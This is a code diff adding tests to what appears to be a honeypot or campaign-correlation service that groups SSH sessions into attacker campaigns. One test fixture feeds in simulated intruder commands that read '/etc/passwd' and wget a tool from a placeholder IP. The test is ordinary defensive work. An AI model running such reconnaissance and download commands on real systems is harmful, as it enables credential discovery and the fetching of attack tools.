@@ -23,7 +23,7 @@ def _ssh_events(
 ) -> list[dict]:
     events: list[dict] = []
     offset = 0.0
-    for index, username in enumerate(usernames):
+    for _index, username in enumerate(usernames):
         events.append(
             {
                 "schema_version": "1.0",
@@ -186,6 +186,16 @@ def test_multi_ip_related_sessions_become_campaign(client, sensor_headers, admin
     assert edge_detail.json()["evidence"]["explanation"]
 
 
+def test_evaluation_components_use_current_pair_separator():
+    from app.correlation.scoring import pair_key
+    from app.evaluation.runner import _hypothesis_components
+
+    components = _hypothesis_components(
+        [pair_key("session::alpha", "session::beta"), pair_key("session::beta", "session::gamma")]
+    )
+    assert components == [["session::alpha", "session::beta", "session::gamma"]]
+
+
 def test_same_ip_unrelated_behaviour_is_not_a_campaign(client, sensor_headers, admin_headers):
     _ingest(
         client,
@@ -289,6 +299,43 @@ def test_feedback_is_recorded_and_marks_campaign(client, sensor_headers, admin_h
     overview = client.get("/api/v1/feedback", headers=admin_headers).json()
     assert overview["counts"]["campaign"]["supported"] == 1
     assert "never retrains" in overview["note"]
+
+
+def test_feedback_rejects_oversized_object_id(client, admin_headers):
+    response = client.post(
+        "/api/v1/feedback",
+        headers=admin_headers,
+        json={"object_type": "campaign", "object_id": "c" * 65, "label": "supported"},
+    )
+    assert response.status_code == 422
+
+
+def test_feedback_rejects_unknown_object(client, admin_headers):
+    response = client.post(
+        "/api/v1/feedback",
+        headers=admin_headers,
+        json={"object_type": "campaign", "object_id": "cmp_missing", "label": "supported"},
+    )
+    assert response.status_code == 404
+
+
+def test_session_ids_with_separators_do_not_break_campaigns(client, sensor_headers, admin_headers):
+    commands = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/tool"]
+    for index in range(2):
+        _ingest(
+            client,
+            sensor_headers,
+            _ssh_events(
+                session_id=f"sess::separator,{index}",
+                ip=f"203.0.113.{30 + index}",
+                commands=commands,
+                usernames=["root"],
+                start_minutes=30 - index,
+            ),
+        )
+    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
+    assert run.status_code == 200, run.text
+    assert run.json()["campaigns"] >= 1
 
 
 def test_viewer_cannot_run_correlation(client, viewer_headers):
